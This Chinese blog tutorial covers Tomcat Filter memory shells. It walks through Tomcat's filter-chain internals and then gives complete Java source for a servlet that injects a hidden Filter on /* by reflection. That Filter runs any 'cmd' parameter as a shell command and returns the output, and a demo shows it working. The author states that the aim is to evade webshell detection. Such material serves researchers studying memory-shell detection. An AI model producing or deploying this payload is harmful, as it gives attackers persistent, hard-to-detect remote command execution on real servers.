## 写在前面

今天开始细说一下内存马相关的知识点了，我打算成立一个专辑，详细讲讲各种内存马的原理，构造，和检测方，同样包括一下tricks。

这篇是专辑的第一篇，详解了Tomcat下的Filter内存马。

## 前置

### 什么是内存马

什么是内存马呢？

内存马又名无文件马，在文件马越来越不好生存的今天，各种基于机器学习的下webshell检测让得文件马更加雪上加霜，于此同时，新的一种技术内存马愈演愈烈，但是简简单单的内存马构造技术似乎也不能够逃脱被检测查杀的风险，我们更加需要迫切的学习内存马底层的相关知识，去掉webshell特征，达到花样绕过检测机制的目的。

回归正题，来到Filter内存马的构造学习。

在Servlet来到了3.0的时代，能够动态的通过`ServletContext`进行注册是我们构造Filter的前提。

### 什么是Filter

Servlet Filter 又称 Servlet 过滤器，它是在 Servlet 2.3 规范中定义的，能够对 Servlet 容器传给 Web 资源的
request 对象和 response 对象进行检查和修改。

Filter 不是 Servlet，不能直接访问，它本身也不能生成 request 对象和 response 对象，它只能为 Web 资源提供以下过滤功能：

  * 在 Web 资源被访问前，检查 request 对象，修改请求头和请求正文，或对请求进行预处理操作。

  * 将请求传递到下一个过滤器或目标资源。

  * 在 Web 资源被访问后，检查 response 对象，修改响应头和响应正文。

而他的工作流程可以通过一张图进行展示。

![image-20220910214207699.png](https://image.3001.net/images/20220911/1662828570_631cc01aeb9c48b6cbc9c.png!small)

自然而然的，如果我们能够实现写入一个自定义的Filter在在访问特定资源的同时，拦截请求，对请求进行自定义Filter中的逻辑进行调用，就能够造成我们的恶意用途，达到了内存马的目的。

也可以来看看Filter的生命周期。

  1. 初始化阶段

  2. 拦截和过滤阶段

  3. 销毁阶段

### 简单的Filter示例

需要注册/映射Filter有两种方式：

> 通过 web.xml 配置
>
> 通过 @WebFilter 注解配置

我们这里采用了web.xml配置。

首先撰写一个实现了`javax.servlet.Filter`接口的类`Demo`。

    
    
    package pers.webshell.Tomcat;
    
    import javax.servlet.*;
    import java.io.IOException;
    
    public class Demo implements Filter {
    
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
            System.out.println("init.....");
        }
    
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            System.out.println("doFilter....");
            filterChain.doFilter(servletRequest, servletResponse);
        }
    
        @Override
        public void destroy() {
            System.out.println("destroy...");
        }
    }
    

之后再在web.xml中配置。

    
    
    <filter>
        <filter-name>myFilter</filter-name>
        <filter-class>pers.webshell.Tomcat.Demo</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>myFilter</filter-name>
        <url-pattern>/filter</url-pattern>
    </filter-mapping>
    

这样就搭建了一个`/filter`路由的拦截器，在访问该路由的时候将会被拦截，运行tomcat容器。

![image-20220910215755755.png](https://image.3001.net/images/20220911/1662828581_631cc025943b67ea061a4.png!small)

可以发现成功拦截了。

### 分析Filter调用过程

我们在我们编写的类中的`doFilter`方法中打下断点，在访问路由的同时，将会调用doFilter路由，在到达路由前存在一些操作，查看一下调用栈吧。

    
    
    doFilter:15, Demo (pers.webshell.Tomcat)
    internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:71, Log4jServletFilter (org.apache.logging.log4j.web)
    internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:196, StandardWrapperValve (org.apache.catalina.core)
    invoke:97, StandardContextValve (org.apache.catalina.core)
    invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:135, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
    invoke:78, StandardEngineValve (org.apache.catalina.core)
    service:364, CoyoteAdapter (org.apache.catalina.connector)
    service:624, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
    run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

关键的就是在`StandardWrapperValve#invoke`中调用了`filterChain.doFilter`。

![image-20220910220644489.png](https://image.3001.net/images/20220911/1662828589_631cc02d7c22605b28b6c.png!small)

那这个`filterChain`是什么呢？看这个单词就知道他是拦截器链对象，我们当然不能猜，我们深入代码看看。

![image-20220910220807260.png](https://image.3001.net/images/20220911/1662828595_631cc033ef98fac98910d.png!small)

由上图可以知道他是一个对象，一个`ApplicationFilterChain`类对象，是通过调用`ApplicationFilterFactory.createFilterChain`方法，传入了在web.xml中通过扫描得到的配置。

当然存在我们编写类的调用，回到`StandardWrapperValve#invoke`在调用了doFilter之后，在其中通过调用`internalDoFilter`方法，进行拦截器的doFilter的调用。

![image-20220910221205108.png](https://image.3001.net/images/20220911/1662828602_631cc03a7a7329a2aa4f5.png!small)

最后到达了拦截器类，接下来就不往后分析了，因为我们已经达到了我们的目的了。

## 正文

通过前面Servlet Filter的深入代码的调用分析，对简单的Filter构造流程有了大概的了解了。

接下来就总结一下并通过反射的方式构造内存马。

### 分析注入手法

通常在配置Filter都是通过web.xml配置或者注解的方式进行配置，但是我们需要注入内存马?

那怎么在代码层面上面进行配置操作，答案在就是使用`ServletContext`的`addFilter/createFilter`方法注册。

![image-20220910223019751.png](https://image.3001.net/images/20220911/1662828608_631cc04049bb8105dea74.png!small)

首先跟进`createFilter`方法看看。

![image-20220910223153012.png](https://image.3001.net/images/20220911/1662828613_631cc045dbaa23614299f.png!small)

> The returned Filter instance may be further customized before it is
> registered with this ServletContext via a call to addFilter(String, Filter).  
> Throws:  
> ServletException – if the given clazz fails to be instantiated  
> UnsupportedOperationException – if this ServletContext was passed to the
> ServletContextListener.contextInitialized method of a ServletContextListener
> that was neither declared in web.xml or web-fragment.xml, nor annotated with
> javax.servlet.annotation.WebListener

根据方法的注释，我们知道他是通过调用`addFilter`方法注册一个filter类，而同时也需要特别注意的是注释中抛出异常的说明。

在Tomcat容器中的实现。

![image-20220910223800819.png](https://image.3001.net/images/20220911/1662828652_631cc06c126fc287f20e0.png!small)

又来到了`addFilter`方法。

![image-20220910223507998.png](https://image.3001.net/images/20220911/1662828658_631cc072e1b211dea0198.png!small)

其中有三个重载，分别接收字符串类型的 filterName 以及 Filter 对象/className 字符串/Filter 子类的 Class
对象，提供不同场景下添加 filter 的功能，这些方法均返回`FilterRegistration.Dynamic`实际上就是
FilterRegistration 对象。

在Tomcat容器中的实现。

![image-20220910223842781.png](https://image.3001.net/images/20220911/1662828669_631cc07d4887efdb7ccc4.png!small)

让我们愉快的解读这段代码吧！

  1. 首先在第一个if语句中说明必须要存在filterName不然会抛出异常

  2. 其次在第二个`if`语句中判断了是否是程序刚刚启动的state，说明只能在不能再程序运行中添加filter对象

  3. 同样可以知道在没有获取到filterDef的情况下，将会创建一个`FilterDef`类对象，将filterName / filterClass / filter对象写入了其中

  4. 最后才是创建了一个`ApplicationFilterRegistration`对象并返回

仅仅这样就可以了吗？

当然不可以，这里不仅限制了，在程序运行中是不能够写入filter的，而且也没有提到`FilterChain`的调用

那`FilterChain`在Tomcat有是在哪个类中有所提及呢？

答案是在`ApplicationFilterFactory `类中

其中存在一个`createFilterChain`方法

![image-20220910235842331.png](https://image.3001.net/images/20220911/1662828683_631cc08b3f9ba0a7728df.png!small)

其中的逻辑。

  1. 首先会调用`context.findFilterMaps`方法中context中获取FilterMaps

  2. 之后会在箭头所指位置匹配

  3. 如果匹配，就会调用`context.findFilterConfig`从context中获取FilterConfig

  4. 如果存在对应的filterConfig，将会将其添加进入filterChain链中

上面就是完整的Tomcat容器获取filterChain中的动态过程，所以如果我们想要注入内存马我们需要

  1. 在context中的filterMaps属性中添加filterMap

  2. 在filterConfigs中添加filterConfig

  3. 而且要保证两个的filterName相同

针对上面的思路我们可以依次解决。

  * 调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；  
![image-20220911000657390.png](https://image.3001.net/images/20220911/1662828693_631cc095cd1b773a09d49.png!small)成功加入了context中去。

  * 调用 StandardContext 的 filterStart 方法生成 filterConfigs；  
![image-20220911000822412.png](https://image.3001.net/images/20220911/1662828703_631cc09f2a7aef103639b.png!small)写入了`filterConfigs`中去。

  * 调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；  
![image-20220911001008131.png](https://image.3001.net/images/20220911/1662828710_631cc0a64c9dde209f204.png!small)成功添加了filterMap。

  * 为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位

### 手搓内存马

既然有了上面讲的思路，那么接下来我们就开始一步一步的构造，一切的一切都首先需要找到`ServletContext`这个context才可以开始构造。

我这里是HttpServlet域下，可以从`request`作用域中获取`ServletContext`对象，之后又通过ServletContext获取ApplicationContext对象，再次通过ApplicationContext获取StandardContext对象，就这样，最终的到了我们需要的StandardContext对象。

    
    
    //从request中获取ServletContext
    ServletContext servletContext = req.getSession().getServletContext();
    
    //从context中获取ApplicationContext对象
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    
    //从ApplicationContext中获取StandardContext对象
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    

之后就是创建一个自定义得Filter对象，其中在doFilter重写中，就是我们需要执行的处理位置，我这是使用了执行命令。

    
    
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            PrintWriter writer = resp.getWriter();
            String cmd = req.getParameter("cmd");
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            try {
                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
                writer.getClass().getDeclaredMethod("flush").invoke(writer);
                writer.getClass().getDeclaredMethod("close").invoke(writer);
                return;
            } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                e.printStackTrace();
            }
    
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
    

再然后就是创建一个FilterDef对象，写入filter / fitlerName / filterClass等信息。

    
    
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    

创建FilterMap对象，添加url映射，下面是直接拦截所有资源`/*。`

    
    
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    //这个不要忘记了
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    

最后通过`addFilterMapBefore`方法的调用将filterMap方法最前面，并且将所有东西都放入`filterConfig`中去。

    
    
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
    
    filterConfigs.put(name, filterConfig);
    

完整的payload。

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.core.ApplicationContext;
    import org.apache.tomcat.util.descriptor.web.FilterDef;
    import org.apache.tomcat.util.descriptor.web.FilterMap;
    import org.apache.catalina.core.ApplicationFilterConfig;
    import org.apache.catalina.Context;
    
    
    import javax.servlet.*;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.PrintWriter;
    import java.lang.reflect.Field;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationTargetException;
    import java.util.Map;
    import java.util.Scanner;
    
    public class AddTomcatFilter extends HttpServlet {
    
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                String name = "RoboTerh";
                //从request中获取ServletContext
                ServletContext servletContext = req.getSession().getServletContext();
    
                //从context中获取ApplicationContext对象
                Field appctx = servletContext.getClass().getDeclaredField("context");
                appctx.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    
                //从ApplicationContext中获取StandardContext对象
                Field stdctx = applicationContext.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    
                //从StandardContext中获得filterConfigs这个map对象
                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);
    
                //如果这个过滤器名字没有注册过
                if (filterConfigs.get(name) == null) {
                    //自定义一个Filter对象
                    Filter filter = new Filter() {
                        @Override
                        public void init(FilterConfig filterConfig) throws ServletException {
    
                        }
    
                        @Override
                        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                            HttpServletRequest req = (HttpServletRequest) servletRequest;
                            if (req.getParameter("cmd") != null) {
                                PrintWriter writer = resp.getWriter();
                                String cmd = req.getParameter("cmd");
                                String[] commands = new String[3];
                                String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                                if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                                    commands[0] = "cmd";
                                    commands[1] = "/c";
                                } else {
                                    commands[0] = "/bin/sh";
                                    commands[1] = "-c";
                                }
                                commands[2] = cmd;
                                try {
                                    writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
                                    writer.getClass().getDeclaredMethod("flush").invoke(writer);
                                    writer.getClass().getDeclaredMethod("close").invoke(writer);
                                    return;
                                } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                                    e.printStackTrace();
                                }
    
                            }
                            filterChain.doFilter(servletRequest, servletResponse);
                        }
    
                        @Override
                        public void destroy() {
    
                        }
    
                    };
    
                    //创建FilterDef对象 并添加 filter对象，filtername, filter类
                    FilterDef filterDef = new FilterDef();
                    filterDef.setFilter(filter);
                    filterDef.setFilterName(name);
                    filterDef.setFilterClass(filter.getClass().getName());
                    //通过addFilterDef方法添加 filterDef 方法
                    standardContext.addFilterDef(filterDef);
    
                    //创建FilterMap对象，并添加 filter映射，filtername
                    FilterMap filterMap = new FilterMap();
                    filterMap.addURLPattern("/*");
                    filterMap.setFilterName(name);
                    //这个不要忘记了
                    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    
                    //通过addFilterMapBefore方法添加filterMap对象
                    standardContext.addFilterMapBefore(filterMap);
    
                    //通过前面获取的filtermaps的put方法放入filterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
    
                    filterConfigs.put(name, filterConfig);
    
                    PrintWriter out = resp.getWriter();
                    out.print("Inject Success !");
                }
    
            } catch (Exception e) {
                e.printStackTrace();
            }
    
        }
    }
    

### 使用实例

我们首先创建一个Servlet实现输入一个id回显在页面上的功能。

    
    
    public class IndexServlet extends HttpServlet {
    
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String message = "Tomcat project!";
            String id = req.getParameter("id");
    
            StringBuilder sb = new StringBuilder();
            sb.append(message);
            if (id != null && id != null) {
                sb.append("\nid: ").append(id); //拼接id
            }
            resp.getWriter().println(sb);
        }
    }
    

也创建一个Servlet就是上面给的内存马的实现，在post请求的时候将会写入一个filter内存马，在之后任意资源位置传入cmd参数将会执行命令。

同样需要在web.xml中配置

    
    
    <servlet>
        <servlet-name>IndexServlet</servlet-name>
        <servlet-class>pres.test.momenshell.IndexServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexServlet</servlet-name>
        <url-pattern>/index</url-pattern>
    </servlet-mapping>
    <servlet>
        <servlet-name>AddTomcatFilter</servlet-name>
        <servlet-class>pres.test.momenshell.AddTomcatFilter</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>AddTomcatFilter</servlet-name>
        <url-pattern>/addTomcatFilter</url-pattern>
    </servlet-mapping>
    

开启tomcat容器

访问`index`路由，并传入一个id参数，将会回显在页面上面, 如下图。

![image-20220911004200512.png](https://image.3001.net/images/20220911/1662828733_631cc0bddcb537855b9fb.png!small)

但是当我们访问`addTomcatFilter`路由的时候。

![image-20220911004324187.png](https://image.3001.net/images/20220911/1662828739_631cc0c3c9a7bb5d98e95.png!small)

如上图所示，成功注入内存马

当我们再次访问index的时候，仍然是同样的回显，但是当我们除了id传参之外也加上了cmd传参，就多了个执行命令的功能。

![image-20220911004534093.png](https://image.3001.net/images/20220911/1662828745_631cc0c990d9afacc2b6c.png!small)

证明Filter内存马成功注入。

## 总结

根据上面流程我们只需要设置filterMaps、filterConfigs、filterDefs就可以注入恶意的filter。

  * filterMaps：一个HashMap对象，包含过滤器名字和URL映射

  * filterDefs：一个HashMap对象，过滤器名字和过滤器实例的映射

  * filterConfigs变量：一个ApplicationFilterConfig对象，里面存放了filterDefs

对于内存马的使用不局限于上面的示例，同样可以写入jsp内存马，或者又是通过java反序列化进行的内存马的写入等等姿势都是存在的。

接下来将会在专辑中添加其他的内存马实现方式！

## Ref

https://su18.org/post/memory-shell

